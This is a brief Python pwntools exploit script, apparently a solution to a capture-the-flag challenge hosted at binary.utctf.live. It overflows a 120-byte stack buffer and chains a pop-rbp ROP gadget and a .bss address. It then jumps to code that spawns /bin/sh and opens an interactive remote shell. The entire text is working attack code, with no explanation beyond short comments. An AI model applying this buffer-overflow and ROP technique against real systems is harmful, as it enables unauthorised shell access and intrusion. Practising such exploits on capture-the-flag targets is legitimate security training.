from pwn import *
#r = process('./pwnable')
r = remote('binary.utctf.live', 9002)
spam = 'A'*0x78     # initial stack has 120 bytes to the return pointer
rop_bp = 0x400520   # pop rbp; ret;
bss = 0x601048      # location of .bss (scratch space)
binsh = 0x4005fe    # jump to here to run /bin/sh
r.sendline(spam + ''.join(map(p64, [rop_bp, bss, binsh])))
r.interactive()
